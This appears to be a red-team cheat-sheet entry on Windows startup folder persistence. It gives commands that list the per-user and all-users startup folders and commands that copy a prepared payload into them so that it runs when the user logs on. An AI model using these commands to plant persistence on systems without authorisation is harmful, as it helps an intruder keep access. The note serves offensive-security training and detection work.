---
technique: Startup Folder Persistence
category: persistence
targets: Windows User Profiles
protocols: Local, SMB
remote_capable: false
tags: windows persistence startup-folder lnk
---

# Startup Folder Persistence

Startup folder persistence runs a staged file or shortcut when the target user logs on.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| User profile access | Operator must write to the target startup folder |
| Logon trigger | The target user must log on interactively |
| Staged command | The startup item must point to a reachable payload or command |

## Windows

### Current user startup folder

#cmd #startup

List the current user's startup folder.

```cmd title:"List current user startup folder"
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```
<!-- cheat -->

### All users startup folder

#cmd #startup

List the all users startup folder.

```cmd title:"List all users startup folder"
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
<!-- cheat -->

### Copy payload to startup

#cmd #startup #persistence

Copy a prepared file into the current user's startup folder.

```cmd title:"Copy payload to startup folder"
copy "$payload_file" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\$file_name"
```
<!-- cheat
var payload_file
var file_name
-->

### Copy payload to all users startup

#cmd #startup #persistence

Copy a prepared file into the all users startup folder.

```cmd title:"Copy payload to all users startup"
copy "$payload_file" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\$file_name"
```
<!-- cheat
var payload_file
var file_name
-->

## Linux

No Linux operator command is included here. This note covers Windows startup folder persistence.
